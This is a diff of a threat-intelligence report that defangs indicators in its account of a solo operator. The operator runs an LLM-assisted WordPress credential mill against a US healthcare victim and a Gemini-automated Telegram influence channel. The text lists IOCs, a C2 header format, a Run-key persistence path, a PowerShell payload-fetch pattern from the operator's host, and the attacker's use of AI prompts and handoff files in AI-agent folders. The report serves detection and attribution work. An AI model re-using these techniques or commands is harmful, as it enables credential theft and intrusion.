 The single operator runs **two concurrent operational tracks** from the same infrastructure:
 
-- **Track A, Credential mill against US healthcare:** Mass WordPress validation rig + AntiPublic.one breach-data lookups + LLM-personalized per-target mutation pipeline → the active, HIPAA-regulated PHI compromise of the healthcare victim at capture
+- **Track A, Credential mill against US healthcare:** Mass WordPress validation rig + AntiPublic[.]one breach-data lookups + LLM-personalized per-target mutation pipeline → the active, HIPAA-regulated PHI compromise of the healthcare victim at capture
 - **Track B, Political IO:** `@americanpatriotus` "Quantum Patriot" Telegram channel (17,000 subscribers per Trend Micro); posting automation via Gemini CLI; live posting workflow captured in Gemini session 2026-03-25T18-27; 5-year operation with AI pivot September 2025 per Trend Micro
 
 Trend Micro's "One Man, One AI, One Fake Persona" framing matches The Hunters Ledger's solo-actor characterization. DFRLab and OpenMinds typically attribute Russian-operated US-targeted Telegram networks to coordinated teams; the single-operator cross-domain combination here is a behavioral observation that does not match the documented coordinated-team baseline.
@@ -846,7 +846,7 @@ The MODERATE 83% confidence can be elevated via the following paths:
 
 | Path | Target confidence | Evidence required | Likelihood |
 |---|---|---|---|
-| **A, Russian forum corpus mapping** | MODERATE → HIGH | Russian-cybercrime-focused TI team mapping `sonner1337` / `братух` to known duty-free.cc forum identity | MODERATE |
+| **A, Russian forum corpus mapping** | MODERATE → HIGH | Russian-cybercrime-focused TI team mapping `sonner1337` / `братух` to known duty-free[.]cc forum identity | MODERATE |
 | **B, Law enforcement attribution** | HIGH → DEFINITE | US FBI / DOJ indictment of bandcampro (via the healthcare victim cybercrime track); OR Russian LE coordination; OR Five Eyes statement | LOW (Russian LE); MODERATE (US indictment) |
 | **C, Subpoena-grade disclosure** | MODERATE → HIGH | Cloudflare T&S (full-admin API token captured, cleanest path); GitHub T&S (`sonner1337` PAT); GCP T&S (service account); Telegram T&S (`@americanpatriotus`); Google AI Studio T&S (40+ stolen Gemini keys) | MODERATE for Cloudflare/GitHub/Telegram; LOW for Google |
 | **D, Third Tier-2 vendor publication** | MODERATE → HIGH | Mandiant / CrowdStrike / Microsoft / Kaspersky / Cisco Talos / Palo Alto Unit 42 / GTIG publication identifying same operator under any tracking handle | MODERATE within weeks of Trend Micro + The Hunters Ledger publications |
@@ -873,9 +873,9 @@ H2, which I reject at effectively zero probability, is coincidental adjacent-ope
 {: .hl-tier-2}
 {: .hl-tab-indicators}
 
-The single highest-signal action for every environment is to block `*.tralalarkefe.com` (the operator-owned custom domain has no legitimate use case) backed by the operator-bespoke `X-Agent-ID: HOSTNAME_user` C2 header, which catches this operator's traffic even after infrastructure migration. The complete detection ruleset (26 rules across YARA, Sigma, and Suricata) is in the separate detection file:
+The single highest-signal action for every environment is to block `*.tralalarkefe[.]com` (the operator-owned custom domain has no legitimate use case) backed by the operator-bespoke `X-Agent-ID: HOSTNAME_user` C2 header, which catches this operator's traffic even after infrastructure migration. The complete detection ruleset (26 rules across YARA, Sigma, and Suricata) is in the separate detection file:
 
-**[`/hunting-detections/russian-gemini-credential-mill-213.165.51.115-detections/`](/hunting-detections/russian-gemini-credential-mill-213.165.51.115-detections/)**
+**[`/hunting-detections/russian-gemini-credential-mill-213[.]165[.]51[.]115-detections/`](/hunting-detections/russian-gemini-credential-mill-213.165.51.115-detections/)**
 
 ### Detection Coverage Summary
 
@@ -891,20 +891,20 @@ The single highest-signal action for every environment is to block `*.tralalarke
 
 The following hunts have the highest signal-to-noise ratio and should be deployed before broader environment sweeps:
 
-1. **Egress block + DNS block on `*.tralalarkefe.com`**: single highest-signal network indicator. Block at perimeter (SNI block + DNS block) for all environments regardless of confirmed victim status. The custom domain has no legitimate use case.
+1. **Egress block + DNS block on `*.tralalarkefe[.]com`**: single highest-signal network indicator. Block at perimeter (SNI block + DNS block) for all environments regardless of confirmed victim status. The custom domain has no legitimate use case.
 2. **YARA file scan for `"Act as an expert red-team password analyst" + google.generativeai import + AI_SNIPER_GOODS output filename`**, single highest-signal file-based indicator. Deploy across developer workstations, CI/CD pipelines, and server-class hosts.
 3. **YARA file scan for AI Operator Handoff Document pattern**: Markdown files in `~/.gemini/`, `~/.claude/`, `~/.codex/` with session-start load directive co-occurring with C2 endpoint references. Higher-risk on server-class Linux hosts.
 4. **Sigma hunt for HTTP requests with `X-Agent-ID` header**: bespoke operator C2 header format `HOSTNAME_user`. Catches operator C2 traffic regardless of domain (resilient to infrastructure migration).
 5. **Sigma hunt for HKCU Run-key `WindowsUpdateManager` + `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1`**: operator's persistence artifact. Any presence is HIGH-confidence indication.
-6. **Sigma hunt for PowerShell `Invoke-RestMethod -Uri https://payloads.tralalarkefe.com/*.ps1` after `SecurityProtocol = Tls12`**, payload-fetch behavior.
-7. **Suricata signature for `c2.tralalarkefe.com` + `/api/v1/*` URI**: network-level C2 detection at perimeter.
+6. **Sigma hunt for PowerShell `Invoke-RestMethod -Uri hxxps://payloads[.]tralalarkefe[.]com/*.ps1` after `SecurityProtocol = Tls12`**, payload-fetch behavior.
+7. **Suricata signature for `c2[.]tralalarkefe[.]com` + `/api/v1/*` URI**: network-level C2 detection at perimeter.
 
 ### Response Orientation (Closing Block)
 
 This is not an incident response guide. It is a brief orientation for readers who need to know *what to address*, not *how to address it*. Readers with confirmed compromise should engage their internal IR team or a dedicated playbook.
 
 **Detection priorities (deploy first):**
-- Egress block on `*.tralalarkefe.com` SNI; DNS block on the domain; IP blocks on operator IP inventory
+- Egress block on `*.tralalarkefe[.]com` SNI; DNS block on the domain; IP blocks on operator IP inventory
 - YARA scan for the LLM credential mutator signature and the AI Operator Handoff Document signature
 - Sigma hunt for `X-Agent-ID` header format on egress HTTP
 
@@ -931,7 +931,7 @@ This section organizes the report's findings by confidence level per CLAUDE.md C
 
 ### DEFINITE (Direct Evidence)
 
-- **Operator infrastructure inventory**: 4 IPs, 6 Cloudflare Tunnel subdomains, 2 GCP projects, 1 GCP service account, 1 Cloudflare full-admin API token, 1 GitHub PAT, AntiPublic.one JWT (`jti:44298` / `sub:31703`), 40+ Gemini API keys
+- **Operator infrastructure inventory**: 4 IPs, 6 Cloudflare Tunnel subdomains, 2 GCP projects, 1 GCP service account, 1 Cloudflare full-admin API token, 1 GitHub PAT, AntiPublic[.]one JWT (`jti:44298` / `sub:31703`), 40+ Gemini API keys
 - **Operator-built tooling source code**: `c2_server.py`, `console.py`, `ai_sniper_brute.py`, `check_keys.py`, `mass_wp_mutator.py`, `quantum_patriot.py`
 - **Three AI Operator Handoff Documents on disk**: `C2_INFRA_TRANSFER.md`, `DEPLOYED_TOOLS.md`, `C2_MIGRATION_GUIDE.md`
 - **`/api/v1/get_results` server-side non-implementation** (iterative-development evidence)
@@ -950,14 +950,14 @@ This section organizes the report's findings by confidence level per CLAUDE.md C
 - **Operator-Built Unauthenticated Python-stdlib C2 with iterative-development evidence**
 - **Four-axis operator profile** (Russian-native DEFINITE; mid-tier selective sophistication HIGH; active campaign with concurrent R&D HIGH; hybrid resource model HIGH)
 - **HKCU Run-key + `%LOCALAPPDATA%\Microsoft\WindowsUpdateManager.ps1` persistence**
-- **Cloudflare Tunnel topology more persistent than ephemeral `trycloudflare.com` abuse**
+- **Cloudflare Tunnel topology more persistent than ephemeral `trycloudflare[.]com` abuse**
 
 ### MODERATE (Reasonable Evidence, Notable Gaps)
 
 - **<a href="/actors/UTA-2026-012/">UTA-2026-012</a> (= bandcampro) attribution** at MODERATE 83% (top of MODERATE band 70-85%, upgraded from parent MODERATE 75% via Trend Micro Tier-2 corroboration)
 - **WMI Event Subscription persistence** (inferred from `stealth.ps1` operator references; binary not extracted)
 - **Scheduled Task persistence** (inferred from operator notes; not directly captured)
-- **WinRM lateral movement** (inferred from `windows_server.tralalarkefe.com` tunnel role)
+- **WinRM lateral movement** (inferred from `windows_server.tralalarkefe[.]com` tunnel role)
 - **Pass-the-Hash lateral movement** (inferred from NTLM hash capture + multi-subnet compromise)
 - **Quasar-class lineage of `agent_final.ps1` PowerShell beacon** (operator handoff document reference; binary not extracted)
 - **State-direction sensitivity** for the political IO track
@@ -985,19 +985,19 @@ The following gaps represent uncertainty in the current analysis and require add
 
 ### Investigation-Side Gaps
 
-1. **Trend Micro "Patriot Bait" full article inaccessibility**: HTTP 403 during research; reviewed via The Register (2026-05-22 Tier 3 / C2) and CyberSecurityNews (2026-05-25 Tier 3 / C3) synthesis. Full article direct access needed to confirm Trend Micro did not document the healthcare victim specifically or the `tralalarkefe.com` domain.
+1. **Trend Micro "Patriot Bait" full article inaccessibility**: HTTP 403 during research; reviewed via The Register (2026-05-22 Tier 3 / C2) and CyberSecurityNews (2026-05-25 Tier 3 / C3) synthesis. Full article direct access needed to confirm Trend Micro did not document the healthcare victim specifically or the `tralalarkefe[.]com` domain.
 2. **Underground forum coverage of LLM credential mutation prior-art**: Recorded Future / Intel 471 dark-web monitoring validation needed before finalizing "first source-code analysis" framing. Current evidence supports the framing; underground-forum validation would convert MODERATE-sensitivity novelty claim to HIGH.
 3. **`@americanpatriotus` pre-September-2025 content analysis**: DFRLab methodology would establish coordination origin vs. organic origin. The 5-year operational history is well-attested by Trend Micro; pre-AI-pivot content characterization is open.
 4. **Hunt.io threat-actor catalog re-query**: Hunt.io catalog had NO MATCH for this operator as of 2026-05-24 query; expected ingestion within 30 days of Trend Micro publication. Future re-query recommended.
-5. **`95.211.175.167` and `85.17.70.56` roles undetermined**: captured in operator filesystem but specific role not determined; live VirusTotal + Hunt.io enrichment needed in follow-up session.
-6. **`tralalarkefe.com` WHOIS / registration date**: Cloudflare DNS masking prevented retrieval; would establish operator domain-registration tempo.
+5. **`95[.]211[.]175[.]167` and `85[.]17[.]70[.]56` roles undetermined**: captured in operator filesystem but specific role not determined; live VirusTotal + Hunt.io enrichment needed in follow-up session.
+6. **`tralalarkefe[.]com` WHOIS / registration date**: Cloudflare DNS masking prevented retrieval; would establish operator domain-registration tempo.
 7. **Third victim machine** referenced in `CLOUDFLARE_INFRA.md` (designation `DES...`, transcript truncation prevented full extraction). Whether this is a second victim organization or a third host within the healthcare victim is open.
 
 ### Defender-Side Gaps
 
 1. **VictimSide forensic confirmation** at the healthcare victim: operator-side artifacts establish capability and configuration; whether PHI has been exfiltrated requires victim-side egress data volume analysis against the operator-access time window.
 2. **Live Cloudflare Tunnel status** at publication time: confirmed configured at capture (operator-side artifacts), but not independently verified post-capture. Cloudflare PSIRT engagement will provide this confirmation.
-3. **Operator activity post-capture**: `213.165.51.115` open-directory cleaned by 2026-05-23 confirms continued operator activity beyond the captured window; specific operator behavior post-cleanup is open.
+3. **Operator activity post-capture**: `213[.]165[.]51[.]115` open-directory cleaned by 2026-05-23 confirms continued operator activity beyond the captured window; specific operator behavior post-cleanup is open.
 
 ---
 
@@ -1027,7 +1027,7 @@ The operator-built C2 source-code analysis is net-new to public reporting. Trend
 
 ### Calibration 4: `web_scraper_bot.py` Dead-Code Finding
 
-`web_scraper_bot.py` is present in the operator's open directory but is dead code, referenced in older versions of the operator's notes and no longer integrated into the active credential mill pipeline. The active pipeline uses `mass_wp_mutator.py`, `nuclei` and the AntiPublic.one integration. The dead-code presence is a development-iteration artifact rather than active operational tooling. My initial-phase analysis included it in the active arsenal, and subsequent phases corrected that to dead-code classification.
+`web_scraper_bot.py` is present in the operator's open directory but is dead code, referenced in older versions of the operator's notes and no longer integrated into the active credential mill pipeline. The active pipeline uses `mass_wp_mutator.py`, `nuclei` and the AntiPublic[.]one integration. The dead-code presence is a development-iteration artifact rather than active operational tooling. My initial-phase analysis included it in the active arsenal, and subsequent phases corrected that to dead-code classification.
 
 ### Calibration 5: `@americanpatriotus` Channel Scope Narrowed
 
@@ -1065,7 +1065,7 @@ This section provides the prioritized hunt activities for defenders preparing to
 
 1. **Audit `cloudflared` process inventory** across internal Linux hosts: any `cloudflared` running with non-organization-account credentials is suspect
 2. **Audit Cloudflare account inventory** for tunnel UUIDs not authorized by the organization (operator-controlled custom-domain tunnels would not appear in the organization's Cloudflare account but their *operation* would be visible in outbound `cloudflared` process behavior)
-3. **Block egress to `*.tralalarkefe.com`** at perimeter as a baseline (no legitimate use case)
+3. **Block egress to `*.tralalarkefe[.]com`** at perimeter as a baseline (no legitimate use case)
 
 ### For LLM API Key Holders (Compute Theft Risk)
 
